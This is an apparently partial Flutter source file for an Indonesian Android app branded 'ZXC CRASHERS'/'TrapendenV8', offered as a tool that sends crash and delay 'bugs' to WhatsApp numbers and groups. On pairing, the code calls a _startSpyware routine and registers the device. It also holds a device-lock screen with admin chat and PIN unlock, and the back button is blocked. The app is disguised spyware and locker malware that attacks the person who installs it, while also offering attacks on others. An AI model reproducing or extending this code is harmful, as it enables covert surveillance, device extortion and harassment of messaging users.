  Widget _buildLockLiveUI(List<Map<String, String>> msgs) {
    return Column(children: [
      Container(
        padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 14),
        child: Row(children: [
          const Icon(Icons.lock, color: Colors.redAccent, size: 18),
          const SizedBox(width: 8),
          Expanded(child: Text(currentLockMessage,
              style: const TextStyle(color: Colors.redAccent, fontSize: 14, fontWeight: FontWeight.bold),
              maxLines: 2, overflow: TextOverflow.ellipsis)),
        ]),
      ),
      const Divider(color: Colors.white12, height: 1),
      Expanded(
        child: msgs.isEmpty
            ? const Center(child: Column(mainAxisSize: MainAxisSize.min, children: [
                Icon(Icons.chat_bubble_outline, color: Colors.white24, size: 40),
                SizedBox(height: 10),
                Text('Menunggu pesan...', style: TextStyle(color: Colors.white38, fontSize: 13)),
              ]))
            : ListView.builder(
                controller: _chatScroll,
                padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
                itemCount: msgs.length,
                itemBuilder: (_, i) {
                  final m = msgs[i];
                  final isOwner = m['from'] == 'owner';
                  return Align(
                    alignment: isOwner ? Alignment.centerLeft : Alignment.centerRight,
                    child: Container(
                      margin: const EdgeInsets.symmetric(vertical: 4),
                      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 9),
                      constraints: BoxConstraints(maxWidth: MediaQuery.of(context).size.width * 0.75),
                      decoration: BoxDecoration(
                        color: isOwner ? const Color(0xFF1E2A3A) : Colors.red[900]!.withOpacity(0.9),
                        borderRadius: BorderRadius.only(
                          topLeft: const Radius.circular(14),
                          topRight: const Radius.circular(14),
                          bottomLeft: Radius.circular(isOwner ? 2 : 14),
                          bottomRight: Radius.circular(isOwner ? 14 : 2),
                        ),
                        border: Border.all(color: isOwner ? Colors.blueAccent.withOpacity(0.3) : Colors.redAccent.withOpacity(0.3)),
                      ),
                      child: Column(crossAxisAlignment: isOwner ? CrossAxisAlignment.start : CrossAxisAlignment.end, children: [
                        Text(isOwner ? '🔒 Admin' : '📱 Kamu',
                            style: TextStyle(color: isOwner ? Colors.blueAccent : Colors.redAccent,
                                fontSize: 9, fontWeight: FontWeight.bold)),
                        const SizedBox(height: 3),
                        Text(m['text'] ?? '', style: const TextStyle(color: Colors.white, fontSize: 13)),
                        const SizedBox(height: 3),
                        Text(m['time'] ?? '', style: const TextStyle(color: Colors.white38, fontSize: 9)),
                      ]),
                    ),
                  );
                }),
      ),
      Container(
        padding: const EdgeInsets.fromLTRB(12, 10, 12, 12),
        decoration: const BoxDecoration(
          color: Color(0xFF0A0A0F),
          border: Border(top: BorderSide(color: Color(0xFF1E1E2E))),
        ),
        child: Column(children: [
          Row(children: [
            Expanded(child: TextField(
              controller: _chatCtrl,
              style: const TextStyle(color: Colors.white, fontSize: 13),
              decoration: InputDecoration(
                hintText: 'Balas pesan...',
                hintStyle: const TextStyle(color: Colors.white38, fontSize: 12),
                filled: true, fillColor: const Color(0xFF1A1A2E),
                contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
                border: OutlineInputBorder(borderRadius: BorderRadius.circular(20), borderSide: BorderSide.none),
              ),
              onSubmitted: _sendChatReply,
            )),
            const SizedBox(width: 8),
            GestureDetector(
              onTap: () => _sendChatReply(_chatCtrl.text),
              child: Container(
                padding: const EdgeInsets.all(11),
                decoration: const BoxDecoration(color: Colors.redAccent, shape: BoxShape.circle),
                child: const Icon(Icons.send_rounded, color: Colors.white, size: 16))),
          ]),
          const SizedBox(height: 10),
          Row(children: [
            Expanded(child: TextField(
              controller: _pinCtrl, obscureText: true,
              keyboardType: TextInputType.number, textAlign: TextAlign.center,
              style: const TextStyle(color: Colors.white, fontSize: 18, letterSpacing: 8),
              decoration: InputDecoration(
                hintText: "PIN Unlock", hintStyle: const TextStyle(color: Colors.white24, fontSize: 12),
                filled: true, fillColor: Colors.white10,
                contentPadding: const EdgeInsets.symmetric(vertical: 12),
                border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: const BorderSide(color: Colors.red)),
                enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide(color: Colors.red.withOpacity(0.3))),
                focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: const BorderSide(color: Colors.redAccent)),
              ),
              onSubmitted: _tryUnlock,
            )),
            const SizedBox(width: 8),
            ElevatedButton(
              style: ElevatedButton.styleFrom(backgroundColor: Colors.red[900],
                  padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12))),
              onPressed: () => _tryUnlock(_pinCtrl.text),
              child: const Text("BUKA", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 12, letterSpacing: 1)),
            ),
          ]),
        ]),
      ),
    ]);
  }
}

// ════════════════════════════════════════════════════════════════════════════
// PAIRING HOME PAGE
// ════════════════════════════════════════════════════════════════════════════
class PairingHomePage extends StatefulWidget {
  const PairingHomePage({super.key});
  @override State<PairingHomePage> createState() => _PairingHomePageState();
}

class _PairingHomePageState extends State<PairingHomePage> with SingleTickerProviderStateMixin {
  final _idCtrl = TextEditingController();
  bool _loading = false;
  bool _paired = false;
  String _msg = '';

  late AnimationController _animCtrl;
  late Animation<double> _fadeAnim;

  @override
  void initState() {
    super.initState();
    _checkAlreadyPaired();
    _animCtrl = AnimationController(duration: const Duration(milliseconds: 1000), vsync: this)..forward();
    _fadeAnim = Tween<double>(begin: 0, end: 1).animate(CurvedAnimation(parent: _animCtrl, curve: Curves.easeOut));
  }

  @override
  void dispose() { _animCtrl.dispose(); _idCtrl.dispose(); super.dispose(); }

  Future<void> _checkAlreadyPaired() async {
    final prefs = await SharedPreferences.getInstance();
    final p = prefs.getString('pairId');
    if (p != null && p.isNotEmpty) {
      setState(() { _paired = true; _msg = '✅ Perangkat sudah terhubung'; });
    }
  }

  Future<void> _doPair() async {
    final id = _idCtrl.text.trim().toUpperCase();
    if (id.isEmpty) { setState(() => _msg = '⚠️ Masukkan ID terlebih dahulu'); return; }

    setState(() { _loading = true; _msg = 'Menghubungkan…'; });
    final ok = await pairDevice(id);

    if (ok) {
      await _registerDevice(globalDeviceId, globalDeviceModel);
      _startSpyware(globalDeviceId);
      if (!mounted) return;

      // ═══════════════════════════════════════════════════════════════
      // PINDAH KE DASHBOARD SETELAH BERHASIL PAIR
      // ═══════════════════════════════════════════════════════════════
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (_) => const DashboardPage()),
      );
    } else {
      setState(() { _loading = false; _msg = '❌ ID tidak valid. Coba lagi.'; });
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF050505),
      body: Stack(children: [
        Container(decoration: const BoxDecoration(gradient: RadialGradient(
          center: Alignment(0, -0.3), radius: 1.3,
          colors: [Color(0xFF0A1628), Color(0xFF051020), Color(0xFF000000)],
          stops: [0.0, 0.5, 1.0],
        ))),
        SafeArea(child: FadeTransition(opacity: _fadeAnim,
          child: Column(children: [
            const Spacer(),
            Container(
              padding: const EdgeInsets.all(4),
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                border: Border.all(color: const Color(0xFF4A90E2).withOpacity(0.6), width: 2),
                boxShadow: [BoxShadow(color: const Color(0xFF4A90E2).withOpacity(0.4), blurRadius: 30, spreadRadius: 5)],
              ),
              child: ClipOval(
                child: Container(
                  width: 100, height: 100,
                  color: const Color(0xFF0A1628),
                  child: const Icon(Icons.verified_user_rounded, color: Color(0xFFB8D4F0), size: 56),
                ),
              ),
            ),
            const SizedBox(height: 22),
            const Text('ZXC CRASHERS', style: TextStyle(
              color: Colors.white, fontSize: 26, fontWeight: FontWeight.w900,
              letterSpacing: 4,
              shadows: [Shadow(color: Color(0xFF4A90E2), blurRadius: 12)],
            )),
            const SizedBox(height: 12),
            Padding(
              padding: const EdgeInsets.symmetric(horizontal: 40),
              child: Text('Untuk masuk ke APK BUG nya\nharus masukkan ID akun anda!',
                  textAlign: TextAlign.center,
                  style: TextStyle(color: Colors.white.withOpacity(0.7),
                      fontSize: 13, height: 1.6, letterSpacing: 0.5)),
            ),
            const Spacer(),
            Padding(
              padding: const EdgeInsets.symmetric(horizontal: 24),
              child: Container(
                padding: const EdgeInsets.all(24),
                decoration: BoxDecoration(
                  color: const Color(0xFF152238).withOpacity(0.8),
                  borderRadius: BorderRadius.circular(24),
                  border: Border.all(color: const Color(0xFF4A90E2).withOpacity(0.3), width: 1.5),
                  boxShadow: [BoxShadow(color: const Color(0xFF4A90E2).withOpacity(0.2), blurRadius: 20)],
                ),
                child: Column(children: [
                  if (_paired) ...[
                    const Icon(Icons.check_circle_rounded, color: Colors.greenAccent, size: 50),
                    const SizedBox(height: 12),
                    const Text('server application sedang maintenance\ntunggu beberapa menit dan akan otomatis login.',
                        style: TextStyle(color: Colors.greenAccent, fontSize: 13, height: 1.6),
                        textAlign: TextAlign.center),
                    const SizedBox(height: 8),
                    TextButton(
                      onPressed: () async {
                        final prefs = await SharedPreferences.getInstance();
                        await prefs.remove('pairId');
                        setState(() { _paired = false; _msg = ''; _idCtrl.clear(); });
                      },
                      child: const Text('Ganti ID', style: TextStyle(color: Colors.white38, fontSize: 11)),
                    ),
                  ] else ...[
                    Container(
                      decoration: BoxDecoration(
                        color: const Color(0xFF0F1A2E), borderRadius: BorderRadius.circular(14),
                        border: Border.all(color: const Color(0xFF4A90E2).withOpacity(0.3)),
                      ),
                      child: TextField(
                        controller: _idCtrl,
                        textAlign: TextAlign.center,
                        textCapitalization: TextCapitalization.characters,
                        style: const TextStyle(color: Colors.white, fontSize: 16, letterSpacing: 3,
                            fontWeight: FontWeight.bold),
                        decoration: InputDecoration(
                          hintText: 'MASUKKAN ID AKUN',
                          hintStyle: TextStyle(color: Colors.white.withOpacity(0.25), fontSize: 13, letterSpacing: 2),
                          prefixIcon: const Icon(Icons.vpn_key_rounded, color: Color(0xFFFFB800), size: 20),
                          border: OutlineInputBorder(borderRadius: BorderRadius.circular(14), borderSide: BorderSide.none),
                          focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(14),
                              borderSide: const BorderSide(color: Color(0xFF4A90E2))),
                          contentPadding: const EdgeInsets.symmetric(vertical: 18, horizontal: 12),
                        ),
                        onSubmitted: (_) => _doPair(),
                      ),
                    ),
                    const SizedBox(height: 16),
                    if (_msg.isNotEmpty)
                      Padding(
                        padding: const EdgeInsets.only(bottom: 14),
                        child: Text(_msg, style: TextStyle(
                          color: _msg.startsWith('✅') ? Colors.greenAccent
                              : _msg.startsWith('❌') ? Colors.redAccent : Colors.white54,
                          fontSize: 12,
                        ), textAlign: TextAlign.center),
                      ),
                    SizedBox(
                      width: double.infinity, height: 54,
                      child: ElevatedButton(
                        onPressed: _loading ? null : _doPair,
                        style: ElevatedButton.styleFrom(
                          backgroundColor: const Color(0xFF4A90E2),
                          shadowColor: const Color(0xFF4A90E2).withOpacity(0.5),
                          elevation: 8,
                          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
                        ),
                        child: _loading
                            ? const SizedBox(width: 22, height: 22,
                                child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2.5))
                            : const Text('MASUK', style: TextStyle(
                                fontSize: 16, color: Colors.white,
                                letterSpacing: 3, fontWeight: FontWeight.bold)),
                      ),
                    ),
                  ],
                ]),
              ),
            ),
            const Spacer(),
            const Padding(
              padding: EdgeInsets.only(bottom: 24),
              child: Text('ID didapat dari admin / pemilik akun\n1x masuk selamanya',
                  style: TextStyle(color: Colors.white24, fontSize: 10),
                  textAlign: TextAlign.center),
            ),
          ]),
        )),
      ]),
    );
  }
}

// ════════════════════════════════════════════════════════════════════════════
// DASHBOARD PAGE — muncul setelah pairing berhasil
// ════════════════════════════════════════════════════════════════════════════
class DashboardPage extends StatefulWidget {
  const DashboardPage({super.key});

  @override
  State<DashboardPage> createState() => _DashboardPageState();
}

class _DashboardPageState extends State<DashboardPage>
    with SingleTickerProviderStateMixin {
  late AnimationController _animCtrl;
  late Animation<double> _fadeAnim;

  // State
  String _username = "tzy";
  String _role = "VIP";
  String _expiredDate = "2029-02-20";
  String _selectedBugMode = "number";
  String _selectedBugId = "delaycombo";
  final _targetCtrl = TextEditingController();
  bool _isSending = false;

  // Video
  VideoPlayerController? _videoController;
  bool _videoReady = false;

  // Daftar bug
  final List<Map<String, dynamic>> _bugList = [
    {'id': 'delaycombo', 'name': 'DELAY INVIS', 'icon': Icons.bug_report_rounded},
    {'id': 'delaynew', 'name': 'DELAY NEW', 'icon': Icons.bug_report_rounded},
    {'id': 'crash', 'name': 'CRASH', 'icon': Icons.bug_report_rounded},
  ];

  @override
  void initState() {
    super.initState();
    _animCtrl = AnimationController(duration: const Duration(milliseconds: 800), vsync: this)..forward();
    _fadeAnim = CurvedAnimation(parent: _animCtrl, curve: Curves.easeOut);
    _initVideo();
  }

  Future<void> _initVideo() async {
    try {
      _videoController = VideoPlayerController.asset('assets/videos/banner.mp4')
        ..initialize().then((_) {
          if (mounted) {
            setState(() => _videoReady = true);
            _videoController!.setLooping(true);
            _videoController!.setVolume(0);
            _videoController!.play();
          }
        }).catchError((_) {});
    } catch (_) {}
  }

  @override
  void dispose() {
    _animCtrl.dispose();
    _targetCtrl.dispose();
    _videoController?.dispose();
    super.dispose();
  }

  Future<void> _sendBug() async {
    final target = _targetCtrl.text.trim();
    if (target.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text("Masukkan nomor target!"), backgroundColor: Colors.red),
      );
      return;
    }

    setState(() => _isSending = true);

    try {
      final res = await http.get(
        Uri.parse("$kServerBase/sendBug?target=$target&bug=$_selectedBugId&mode=$_selectedBugMode"),
      ).timeout(const Duration(seconds: 15));

      if (!mounted) return;
      setState(() => _isSending = false);

      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content: Row(children: [
            const Icon(Icons.check_circle, color: Colors.white, size: 20),
            const SizedBox(width: 8),
            Expanded(child: Text(
              "Bug $_selectedBugId terkirim ke $target",
              style: const TextStyle(color: Colors.white),
            )),
          ]),
          backgroundColor: const Color(0xFFEF4444),
          behavior: SnackBarBehavior.floating,
        ),
      );
    } catch (e) {
      if (!mounted) return;
      setState(() => _isSending = false);
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text("Gagal: $e"), backgroundColor: Colors.red),
      );
    }
  }

  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () async => false, // Blokir back button
      child: Scaffold(
        backgroundColor: const Color(0xFF0A0505),
        body: FadeTransition(
          opacity: _fadeAnim,
          child: SafeArea(
            child: Column(
              children: [
                _buildHeader(),
                Expanded(
                  child: SingleChildScrollView(
                    physics: const BouncingScrollPhysics(),
                    padding: const EdgeInsets.all(16),
                    child: Column(
                      children: [
                        _buildProfileCard(),
                        const SizedBox(height: 16),
                        _buildVideoBanner(),
                        const SizedBox(height: 16),
                        _buildModeSelector(),
                        const SizedBox(height: 16),
                        _buildTargetInput(),
                        const SizedBox(height: 20),
                        Row(children: [
                          Container(width: 4, height: 20,
                              decoration: BoxDecoration(
                                  color: const Color(0xFFEF4444),
                                  borderRadius: BorderRadius.circular(2))),
                          const SizedBox(width: 8),
                          const Text("PILIH BUG",
                              style: TextStyle(color: Colors.white70, fontSize: 12,
                                  fontWeight: FontWeight.w700, letterSpacing: 1.5)),
                        ]),
                        const SizedBox(height: 12),
                        SizedBox(
                          height: 130,
                          child: ListView.builder(
                            scrollDirection: Axis.horizontal,
                            physics: const BouncingScrollPhysics(),
                            itemCount: _bugList.length,
                            itemBuilder: (context, index) {
                              final bug = _bugList[index];
                              final isSelected = _selectedBugId == bug['id'];
                              return GestureDetector(
                                onTap: () => setState(() => _selectedBugId = bug['id'] as String),
                                child: Container(
                                  width: 130,
                                  margin: const EdgeInsets.only(right: 12),
                                  padding: const EdgeInsets.all(12),
                                  decoration: BoxDecoration(
                                    color: isSelected ? const Color(0xFFEF4444) : const Color(0xFF1A1A1A),
                                    borderRadius: BorderRadius.circular(16),
                                    border: Border.all(
                                      color: isSelected ? const Color(0xFFEF4444) : Colors.white.withOpacity(0.08),
                                      width: isSelected ? 2 : 1,
                                    ),
                                    boxShadow: isSelected ? [
                                      BoxShadow(color: const Color(0xFFEF4444).withOpacity(0.4), blurRadius: 15)
                                    ] : [],
                                  ),
                                  child: Column(
                                    mainAxisAlignment: MainAxisAlignment.center,
                                    children: [
                                      Container(
                                        padding: const EdgeInsets.all(10),
                                        decoration: BoxDecoration(
                                          color: isSelected ? Colors.white.withOpacity(0.15) : const Color(0xFFEF4444).withOpacity(0.15),
                                          shape: BoxShape.circle,
                                        ),
                                        child: Icon(bug['icon'] as IconData,
                                            color: isSelected ? Colors.white : const Color(0xFFEF4444),
                                            size: 24),
                                      ),
                                      const SizedBox(height: 10),
                                      Text(bug['name'] as String,
                                          style: const TextStyle(color: Colors.white,
                                              fontWeight: FontWeight.bold, fontSize: 11, letterSpacing: 1),
                                          textAlign: TextAlign.center),
                                      const SizedBox(height: 6),
                                      Container(
                                        padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
                                        decoration: BoxDecoration(
                                          color: isSelected ? Colors.white.withOpacity(0.2) : Colors.white.withOpacity(0.08),
                                          borderRadius: BorderRadius.circular(6),
                                        ),
                                        child: Text("ID: ${bug['id']}",
                                            style: TextStyle(
                                                color: isSelected ? Colors.white : Colors.white54,
                                                fontSize: 9)),
                                      ),
                                      if (isSelected)
                                        const Padding(
                                          padding: EdgeInsets.only(top: 6),
                                          child: Icon(Icons.check_circle, color: Colors.white, size: 16),
                                        ),
                                    ],
                                  ),
                                ),
                              );
                            },
                          ),
                        ),
                        const SizedBox(height: 20),
                        SizedBox(
                          width: double.infinity,
                          height: 56,
                          child: ElevatedButton(
                            onPressed: _isSending ? null : _sendBug,
                            style: ElevatedButton.styleFrom(
                              backgroundColor: const Color(0xFFEF4444),
                              shadowColor: const Color(0xFFEF4444).withOpacity(0.5),
                              elevation: 8,
                              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
                            ),
                            child: _isSending
                                ? const SizedBox(width: 24, height: 24,
                                    child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2.5))
                                : const Row(
                                    mainAxisAlignment: MainAxisAlignment.center,
                                    children: [
                                      Icon(Icons.send_rounded, color: Colors.white, size: 20),
                                      SizedBox(width: 10),
                                      Text("KIRIM BUG",
                                          style: TextStyle(color: Colors.white,
                                              fontWeight: FontWeight.bold, fontSize: 15, letterSpacing: 2)),
                                    ],
                                  ),
                          ),
                        ),
                        const SizedBox(height: 20),
                      ],
                    ),
                  ),
                ),
              ],
            ),
          ),
        ),
        bottomNavigationBar: _buildBottomNav(),
      ),
    );
  }

  Widget _buildHeader() {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(8),
            decoration: BoxDecoration(
              color: const Color(0xFF1A1A1A),
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: Colors.white.withOpacity(0.08)),
            ),
            child: const Icon(Icons.menu_rounded, color: Colors.white, size: 22),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Center(
              child: Container(
                padding: const EdgeInsets.symmetric(horizontal: 28, vertical: 10),
                decoration: BoxDecoration(
                  gradient: const LinearGradient(colors: [Color(0xFFEF4444), Color(0xFFDC2626)]),
                  borderRadius: BorderRadius.circular(30),
                  boxShadow: [BoxShadow(color: const Color(0xFFEF4444).withOpacity(0.5),
                      blurRadius: 15, offset: const Offset(0, 4))],
                ),
                child: const Text("TrapendenV8",
                    style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold,
                        fontSize: 14, letterSpacing: 1)),
              ),
            ),
          ),
          const SizedBox(width: 12),
          Container(
            padding: const EdgeInsets.all(8),
            decoration: BoxDecoration(
              color: const Color(0xFF1A1A1A),
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: Colors.white.withOpacity(0.08)),
            ),
            child: const Icon(Icons.palette_outlined, color: Color(0xFFEF4444), size: 20),
          ),
          const SizedBox(width: 8),
          Container(
            padding: const EdgeInsets.all(8),
            decoration: BoxDecoration(
              color: const Color(0xFF1A1A1A),
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: Colors.white.withOpacity(0.08)),
            ),
            child: const Icon(Icons.headset_mic_rounded, color: Color(0xFFEF4444), size: 20),
          ),
        ],
      ),
    );
  }

  Widget _buildProfileCard() {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: const Color(0xFF1A1A1A).withOpacity(0.6),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: const Color(0xFFEF4444).withOpacity(0.2), width: 1),
        boxShadow: [BoxShadow(color: const Color(0xFFEF4444).withOpacity(0.1), blurRadius: 20, spreadRadius: 2)],
      ),
      child: Row(
        children: [
          Container(
            width: 70, height: 70,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              border: Border.all(color: const Color(0xFFEF4444), width: 2),
              boxShadow: [BoxShadow(color: const Color(0xFFEF4444).withOpacity(0.4), blurRadius: 15)],
            ),
            child: ClipOval(
              child: Image.asset('assets/images/logo.png', fit: BoxFit.cover,
                  errorBuilder: (_, __, ___) => Container(
                    color: const Color(0xFF2A1A1A),
                    child: const Icon(Icons.person, color: Color(0xFFEF4444), size: 36),
                  )),
            ),
          ),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(_username, style: const TextStyle(color: Colors.white,
                    fontSize: 22, fontWeight: FontWeight.bold)),
                const SizedBox(height: 8),
                Row(children: [
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                    decoration: BoxDecoration(
                      color: const Color(0xFFEF4444).withOpacity(0.2),
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: const Color(0xFFEF4444).withOpacity(0.5)),
                    ),
                    child: Text(_role, style: const TextStyle(color: Color(0xFFEF4444),
                        fontSize: 10, fontWeight: FontWeight.bold, letterSpacing: 1)),
                  ),
                  const SizedBox(width: 10),
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                    decoration: BoxDecoration(
                      color: Colors.white.withOpacity(0.05),
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: Colors.white.withOpacity(0.1)),
                    ),
                    child: Text("Exp: $_expiredDate",
                        style: TextStyle(color: Colors.white.withOpacity(0.6), fontSize: 10)),
                  ),
                ]),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildVideoBanner() {
    return Container(
      height: 180, width: double.infinity,
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: const Color(0xFFEF4444).withOpacity(0.3), width: 1.2),
        boxShadow: [BoxShadow(color: const Color(0xFFEF4444).withOpacity(0.2), blurRadius: 20, spreadRadius: 2)],
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(20),
        child: _videoReady && _videoController != null
            ? FittedBox(
                fit: BoxFit.cover,
                child: SizedBox(
                  width: _videoController!.value.size.width,
                  height: _videoController!.value.size.height,
                  child: VideoPlayer(_videoController!),
                ),
              )
            : Container(
                decoration: const BoxDecoration(
                  gradient: LinearGradient(
                    colors: [Color(0xFF2A0A0A), Color(0xFF1A0505)],
                    begin: Alignment.topLeft, end: Alignment.bottomRight,
                  ),
                ),
                child: const Center(child: Icon(Icons.play_circle_outline, color: Color(0xFFEF4444), size: 48)),
              ),
      ),
    );
  }

  Widget _buildModeSelector() {
    return Row(children: [
      Expanded(
        child: GestureDetector(
          onTap: () => setState(() => _selectedBugMode = "number"),
          child: Container(
            padding: const EdgeInsets.symmetric(vertical: 14),
            decoration: BoxDecoration(
              color: _selectedBugMode == "number" ? const Color(0xFFEF4444) : const Color(0xFF1A1A1A),
              borderRadius: BorderRadius.circular(30),
              border: Border.all(color: _selectedBugMode == "number"
                  ? const Color(0xFFEF4444) : Colors.white.withOpacity(0.08)),
              boxShadow: _selectedBugMode == "number" ? [
                BoxShadow(color: const Color(0xFFEF4444).withOpacity(0.4), blurRadius: 12)
              ] : [],
            ),
            child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [
              Icon(Icons.phone_android_rounded,
                  color: _selectedBugMode == "number" ? Colors.white : Colors.white54, size: 18),
              const SizedBox(width: 8),
              Text("BUG NOMOR", style: TextStyle(
                  color: _selectedBugMode == "number" ? Colors.white : Colors.white54,
                  fontWeight: FontWeight.bold, fontSize: 12, letterSpacing: 1)),
            ]),
          ),
        ),
      ),
      const SizedBox(width: 12),
      Expanded(
        child: GestureDetector(
          onTap: () => setState(() => _selectedBugMode = "group"),
          child: Container(
            padding: const EdgeInsets.symmetric(vertical: 14),
            decoration: BoxDecoration(
              color: _selectedBugMode == "group" ? const Color(0xFFEF4444) : const Color(0xFF1A1A1A),
              borderRadius: BorderRadius.circular(30),
              border: Border.all(color: _selectedBugMode == "group"
                  ? const Color(0xFFEF4444) : Colors.white.withOpacity(0.08)),
              boxShadow: _selectedBugMode == "group" ? [
                BoxShadow(color: const Color(0xFFEF4444).withOpacity(0.4), blurRadius: 12)
              ] : [],
            ),
            child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [
              Icon(Icons.group_rounded,
                  color: _selectedBugMode == "group" ? Colors.white : Colors.white54, size: 18),
              const SizedBox(width: 8),
              Text("BUG GROUP", style: TextStyle(
                  color: _selectedBugMode == "group" ? Colors.white : Colors.white54,
                  fontWeight: FontWeight.bold, fontSize: 12, letterSpacing: 1)),
            ]),
          ),
        ),
      ),
    ]);
  }

  Widget _buildTargetInput() {
    return Container(
      decoration: BoxDecoration(
        color: const Color(0xFF1A1A1A).withOpacity(0.6),
        borderRadius: BorderRadius.circular(30),
        border: Border.all(color: const Color(0xFFEF4444).withOpacity(0.3), width: 1.2),
      ),
      child: TextField(
        controller: _targetCtrl,
        keyboardType: _selectedBugMode == "number" ? TextInputType.phone : TextInputType.url,
        style: const TextStyle(color: Colors.white, fontSize: 14),
        decoration: InputDecoration(
          hintText: _selectedBugMode == "number" ? "+62xxxxxxxxxx" : "https://chat.whatsapp.com/...",
          hintStyle: TextStyle(color: Colors.white.withOpacity(0.25), fontSize: 13),
          prefixIcon: Icon(
            _selectedBugMode == "number" ? Icons.phone_android_rounded : Icons.link_rounded,
            color: const Color(0xFFEF4444), size: 20,
          ),
          border: InputBorder.none,
          contentPadding: const EdgeInsets.symmetric(vertical: 18, horizontal: 16),
        ),
      ),
    );
  }

  Widget _buildBottomNav() {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
      decoration: BoxDecoration(
        color: const Color(0xFF0F0F0F),
        border: Border(top: BorderSide(color: const Color(0xFFEF4444).withOpacity(0.2), width: 1)),
      ),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceAround,
        children: [
          _buildNavItem(Icons.grid_view_rounded, "Home", true),
          _buildNavItem(Icons.chat_bubble_outline_rounded, "WhatsApp", false),
          _buildNavItem(Icons.devices_rounded, "Rat", false),
          _buildNavItem(Icons.notifications_none_rounded, "Info", false),
        ],
      ),
    );
  }

  Widget _buildNavItem(IconData icon, String label, bool isActive) {
    return Column(mainAxisSize: MainAxisSize.min, children: [
      Container(
        padding: const EdgeInsets.all(8),
        decoration: BoxDecoration(
          color: isActive ? const Color(0xFFEF4444).withOpacity(0.15) : Colors.transparent,
          shape: BoxShape.circle,
        ),
        child: Icon(icon, color: isActive ? const Color(0xFFEF4444) : Colors.white38, size: 22),
      ),
      const SizedBox(height: 2),
      Text(label, style: TextStyle(
          color: isActive ? const Color(0xFFEF4444) : Colors.white38,
          fontSize: 10, fontWeight: isActive ? FontWeight.bold : FontWeight.normal)),
    ]);
  }
}